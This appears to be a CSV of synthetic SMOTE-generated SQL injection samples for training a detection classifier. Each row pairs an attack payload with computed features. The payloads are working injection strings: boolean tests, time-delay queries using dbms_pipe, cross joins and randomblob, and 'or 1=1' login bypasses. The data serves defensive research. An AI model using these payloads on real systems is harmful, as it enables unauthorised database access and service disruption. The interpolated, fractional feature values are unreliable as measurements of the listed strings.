id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000106,attack,boolean,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'rhzy'  =  'rhzy",nearest_attack_euclidean,R000017,1.9427205122647067,169.02346028711588,30.97863427399527,3.8899636345631037,101.38458306808516,10.04273145200946,41.085462904018925,16.510682863002366,0.5969139593398691,0.05893658775159885,0.24479845378365847,0.09935099912487357,4.0,0.0,0.0,0.0,1.0,2.0,0.0,4.0,0.0,0.0,4.042731452009461,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.4893171369976348,0.5106828630023652,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000107,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000038,0.851113344494066,254.40138328600463,36.39907780933026,3.803228126166028,80.80276657200923,29.79815561866051,100.0,43.800461095334875,0.31758157557438493,0.11716292510837685,0.3930884169218727,0.17216708239536554,3.4013832860046174,0.0,0.39907780933025483,0.0,0.0,2.0,0.0,22.0,0.0,2.0,4.0,12.399077809330254,1.0,0.0,0.19953890466512744,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.19953890466512747,0.0,0.8004610953348725,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000108,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000154,0.6859050450044438,134.48045014150352,30.558436011320282,4.12040299406642,76.46748809056227,4.883127977359434,37.23374404528113,15.896090028300708,0.568137411264499,0.037622119022627756,0.2765830193056348,0.11765745040723843,0.0,2.5584360113202833,0.0,0.0,1.0,1.0,0.0,4.779218005660142,0.0,0.0,2.779218005660142,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.7792180056601415,0.22078199433985862,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000109,attack,boolean,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",nearest_attack_euclidean,R000013,2.3499344905448676,170.0831639716479,31.938166579730577,3.8038432435513947,51.2217496087876,21.159916188518174,67.01066527568923,30.690832898652886,0.3063745235709604,0.12263625612391071,0.3899025006933757,0.1810867196117532,4.0,0.0,0.0,0.0,0.0,2.0,0.0,13.752666318922309,0.9381665797305769,1.5309167101347114,1.9381665797305772,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.4690832898652886,0.5309167101347114,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.345416449326443,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.345416449326443
SMOTE_000110,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  'wweo'  =  'wweo",nearest_attack_euclidean,R000046,0.6740412221327661,126.2306277182261,28.3015129892807,4.06499785804335,72.01228788055165,6.879963206738788,29.036863641654964,18.3015129892807,0.5771014713237329,0.051343169559484134,0.2271090673105794,0.14444629180620353,3.1446125543645222,0.0,0.0,0.0,1.0,1.1446125543645222,0.0,3.4338376630935663,0.0,5.0,4.0,2.7230627718226104,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.14461255436452214,1.1446125543645222,0.0,0.14461255436452217,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2892251087290445
SMOTE_000111,attack,boolean,"1%""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000143,0.1324644375867265,147.36769518420638,29.09597860941799,3.675970213482625,40.38391443767197,16.26394117589948,60.57587165650796,30.14396791412699,0.27401793982494943,0.11015089711633785,0.4110269097374242,0.2048042533212885,0.09597860941799219,3.9040213905820074,0.0,0.0,0.0,2.0,0.0,12.14396791412699,1.9999999999999998,1.976005347645502,1.047989304708996,8.0,0.023994652354498047,0.9760053476455022,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.11997326177249024,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1199732617724902
SMOTE_000112,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb",nearest_attack_euclidean,R000084,1.1396351922833319,133.51222520874398,29.867735617066153,4.21109868500675,80.35551040832216,5.041282740479383,32.206413702396915,15.909018357545536,0.6086938697243842,0.03682303439294146,0.23679906411468438,0.1176840317679899,0.5206413702396914,2.479358629760309,0.0,0.0,0.8264528765867696,0.0,0.0,4.561924110719074,0.0,0.34709424682646073,2.652905753173539,1.8677356170661512,0.1735471234132303,0.8264528765867698,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.469446951953614e-18,0.17354712341323048,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000113,attack,boolean,"1'||  (  select 'hwyv' from dual where 1155  =  1155 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R000120,2.672383772553104,152.78396675243118,34.0,4.079801826703944,64.45991688107796,18.63502077973051,50.581012467838306,19.10801662378441,0.4204851641045142,0.12247915164274746,0.33154382022748197,0.12549186402525636,2.581012467838306,0.0,0.9459916881077957,0.0,1.0,2.0,0.0,7.054008311892204,0.0,0.5270041559461021,1.472995844053898,6.054008311892204,1.0,0.0,0.4729958440538978,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.5270041559461022,1.527004155946102,0.0,1.0,1.527004155946102,0.5270041559461022,0.47299584405389783,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.054008311892204
SMOTE_000114,attack,boolean,1 where 3802  =  3802 and 2006  =  2006,nearest_attack_euclidean,R000049,0.722484310288532,35.540410334142564,14.089581666879624,3.254525925956238,7.089581666879631,15.543330667007401,10.90749800025555,2.0,0.19509025940405741,0.43846528247803185,0.30629166410289177,0.06015279401501902,0.0,0.1820836666240747,0.0,0.0,0.0,1.8179163333759252,0.0,0.0,0.0,0.0,0.0,1.817916333375925,0.0,0.18208366662407466,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.8179163333759254,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8179163333759254
SMOTE_000115,attack,boolean,1'+  (  select bgbq where 1589  =  1589 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +',nearest_attack_euclidean,R000115,1.7919272341185661,379.314711631317,31.0,3.2952537913698157,95.69669476957311,52.84264418434151,177.6966947695731,53.078677907829245,0.252160220677766,0.13953065595502562,0.4684138857842076,0.13989523758300074,2.5393389539146227,0.0,0.0,0.0,0.0,2.2696694769573114,0.0,36.53933895391462,0.0,0.0,0.26966947695731136,13.730330523042689,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,2.0,0.0,0.7303305230426886,0.0,1.2696694769573114,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.26966947695731136,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,18.26966947695731
SMOTE_000116,attack,boolean,"1""   )    )    as wnzf where 3352  =  3352 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000067,3.290149459442366,311.07862636481417,38.17462055612202,3.756503880537854,89.84110471684082,41.53958694132889,127.68220943368163,52.015725272962825,0.289952402143134,0.13360649584797313,0.40980653228589004,0.16663456972300278,0.0,2.238069165816971,1.5873102780610098,0.0,0.0,2.4126897219389907,0.0,26.47613833163394,0.0,2.4126897219389902,2.3492411122440386,18.126897219389903,0.0,1.0,0.5873102780610095,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.4126897219389904,0.0,0.5873102780610097,0.4126897219389903,0.4126897219389903,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.111171946427069,0.0,0.0,0.0,0.0,0.0,0.0,0.4126897219389904,0.4126897219389904,7.76193083418303
SMOTE_000117,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R000031,0.04504843415160496,101.34288262083946,30.870923371950607,3.5739974094755644,23.77704946064196,16.0,45.67144131041973,15.894391849777769,0.23380858100710417,0.15910355457514253,0.450280139195268,0.15680772522248534,3.964797283259257,0.0,1.0,0.0,0.0,1.0,0.0,7.941328805432095,0.0,0.9882657610864187,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.9882657610864187,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.988265761086419
SMOTE_000118,attack,boolean,1'+  (  select bfeq where 3445  =  3445 and 9198  =  9198--,nearest_attack_euclidean,R000149,1.1372530974448192,60.92588348966356,26.38517669793271,3.9768531792706985,18.0,17.0,18.54070679173084,7.3851766979327085,0.2959041570937649,0.27946503725522237,0.30353858087601676,0.12109222477499604,1.3851766979327098,0.0,1.2296466041345802,0.0,0.0,2.0,0.0,1.3851766979327103,0.0,0.0,0.0,4.61482330206729,1.0,0.0,0.61482330206729,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000119,attack,boolean,"1 and elt  (  4249  =  4249,7259  )  -- meef",nearest_attack_euclidean,R000110,1.505410424691768,48.511602820522,20.82029142191309,3.6354846291610277,11.640582843826188,14.640582843826184,16.23043713286964,6.000000000000002,0.23845851938972396,0.3010474415130438,0.33531619485059255,0.12517784424663964,0.0,0.41014571095654606,2.0,0.0,0.0,1.410145710956546,0.0,1.5898542890434548,0.0,0.0,0.5898542890434537,3.410145710956546,0.0,0.4101457109565461,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.41014571095654606,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.410145710956546
SMOTE_000120,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000104,0.5706873781648433,146.78053899286343,32.55610779857268,4.323676618622595,85.82244311942907,8.467329358287223,35.93465871657445,16.556107798572686,0.5860801943823706,0.05718809392991045,0.24417537378402498,0.11255633790369408,3.911221559714537,0.0,0.0,0.0,1.0,0.9112215597145372,0.0,3.911221559714537,0.0,0.0,2.911221559714537,1.9112215597145368,1.0,0.0,0.0,0.0,0.0,0.9112215597145372,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.9112215597145372,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.911221559714537
SMOTE_000121,attack,boolean,admin'  )   or '1'  =  '1,nearest_attack_euclidean,R000006,1.9456078671706258,56.39587972363985,19.747035256482558,3.1844740410996843,13.93155786106334,7.7083417679345185,24.6785931175459,10.077386977096085,0.2617716817494528,0.11133991558866009,0.42078667870676434,0.20610172395512275,4.0,0.0,0.40773869770960836,0.0,0.0,1.0,0.0,3.8541708839672584,0.0,0.4077386977096083,0.40773869770960847,1.4077386977096085,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.4077386977096083,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4077386977096085
SMOTE_000122,attack,boolean,-5830'  )   as fivy where 2173  =  2173 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R000071,0.05858993551678273,153.9694253512428,37.969425351242776,4.376993744830512,63.079494086768776,25.938850702485556,44.975540280994224,19.975540280994224,0.4097083714910702,0.16845541484574494,0.29210359376218886,0.12973261990099602,4.975540280994223,0.0,2.9938850702485555,0.0,0.006114929751444176,2.0,0.0,5.0,0.0,0.0,0.012229859502888463,8.975540280994224,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9938850702485559,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9938850702485558,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9938850702485558,0.9938850702485558,6.981655210745667
SMOTE_000123,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000151,1.662842175792254,106.67276136614242,28.621489153006472,3.942298641163924,51.88765289620716,11.02808677594821,32.514043387974105,11.242978306012947,0.4761125157204963,0.10835417375454931,0.3099821773975322,0.10555113312742215,0.0,0.6214891530064737,0.0,0.0,1.0,1.0,0.0,4.757021693987053,0.0,0.3785108469935264,1.6214891530064737,2.0,0.0,0.6214891530064738,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.3785108469935263,0.6214891530064737,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000124,attack,boolean,"1' where 1230  =  1230 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000105,1.0088402223230102,252.70955134558767,37.52696576960823,3.8224751198518145,77.41910269117531,32.053931539216464,100.0,43.23651711519588,0.3063132271383678,0.12687792644690565,0.39572120861253085,0.17108763780219566,1.7095513455876525,0.0,1.5269657696082315,0.0,0.0,2.0,0.0,22.0,0.0,2.0,4.0,13.526965769608232,1.0,0.0,0.7634828848041157,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.763482884804116,0.0,0.2365171151958841,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000125,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R000031,0.05986448526095034,101.53866160487924,30.88170810381519,3.572081061332322,23.77524539724886,16.0,45.78707458686734,15.976341620763037,0.23344960348619387,0.15801142457546408,0.4509030771920361,0.15763589474630596,4.0,0.0,1.0,0.0,0.011829189618481117,1.011829189618481,0.0,7.952683241526076,0.023658379236962068,0.9881708103815189,0.9881708103815189,2.023658379236962,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000126,attack,boolean,"1""  )   as paai where 4089  =  4089 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000014,0.7614445425255745,154.20471167930526,35.330243237524456,4.184231526806548,79.8744684417808,16.0,42.55349549168297,15.776747745841487,0.5172894759143114,0.10399158870325503,0.2763106959994516,0.1024082393829819,0.0,0.7767477458414861,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.0,5.0,0.0,0.7767477458414862,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.7767477458414861,0.2232522541585139,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000127,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000118,1.8445249641245554,110.77074301807724,29.53165950313585,3.441096690226536,33.64410500553385,8.838428001475695,50.32096100848524,17.967249002582463,0.3028814491866062,0.07913957629738941,0.4489445256385931,0.16903444887741126,1.7096070003689234,2.7096070003689237,0.0,1.1451964998155382,0.14519649981553828,0.8548035001844616,0.0,9.693231501660156,0.8548035001844614,0.0,0.8548035001844618,2.145196499815538,0.8548035001844618,1.0,0.0,0.0,0.14519649981553837,0.8548035001844618,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.8548035001844617,0.0,0.0,0.0,0.8548035001844617,0.1451964998155384,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8548035001844618
SMOTE_000128,attack,boolean,"admin""  )   or   (  ""1""  =  ""1""--",nearest_attack_euclidean,R000003,0.0970370766695161,33.803380487168155,14.142823197718783,2.9580881660877085,7.107117398289091,2.1785289971484794,14.46417539258605,10.053558699144544,0.2113097166796281,0.06227066664007906,0.4258237999747418,0.300595816705551,0.0,4.982147100285152,1.982147100285152,0.0,0.0,1.017852899714848,0.0,2.0714115988593917,0.0,0.0,0.0,3.0,0.0,1.0,0.9821471002851521,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.017852899714847936,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.017852899714848
SMOTE_000129,attack,boolean,"1%'   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,0.864235125284047,130.34918934219354,30.34918934219355,3.9819714953946375,65.0,8.0,41.0,16.34918934219355,0.4986864721437611,0.06137679657153983,0.3145560824291416,0.12538064885555741,0.6745946710967755,0.0,2.0,0.0,1.0,1.0,0.0,6.0,0.6745946710967754,0.0,2.0,4.0,0.6745946710967756,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000130,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000030,1.9081534398301825,147.46233431078338,31.07533137843324,4.043857868848473,77.15066275686648,8.0,43.92466862156676,18.38700293235014,0.5232406239523574,0.05425176160662498,0.2978509795921414,0.12465663484887633,0.0,3.9999999999999996,0.0,0.0,1.0,1.4623343107833804,0.0,6.0,0.9246686215667603,0.0,2.0,2.46233431078338,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.4623343107833802,0.5376656892166197,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000131,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000043,1.0960955511057335,258.71242351778864,37.235621175889435,3.786838522847082,78.79591646739188,31.942484703557724,105.12059058300488,42.853431763834145,0.3047437450884166,0.12301618918292181,0.406064794836718,0.16617527089194362,0.0,0.0,2.0,0.0,0.0,1.6178105879447156,0.0,23.235621175889428,0.0,2.0,4.0,13.617810587944717,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.6178105879447158,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.617810587944716
SMOTE_000132,attack,boolean,1' in boolean mode  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  #,nearest_attack_euclidean,R000036,2.4592174969567546,360.6347260542535,31.59855308107277,3.284805037130575,91.80289383785447,50.211575351417835,169.0144691892723,49.60578767570892,0.25473926432022675,0.1390270148056809,0.46871300198657356,0.1375207188875188,1.4014469189272298,0.0,0.0,0.0,0.0,1.4014469189272298,0.0,35.40144691892723,0.0,0.0,0.0,12.20434075678169,1.0,0.0,0.0,0.5985530810727703,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.4014469189272298,0.0,0.4014469189272297,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,16.80289383785446
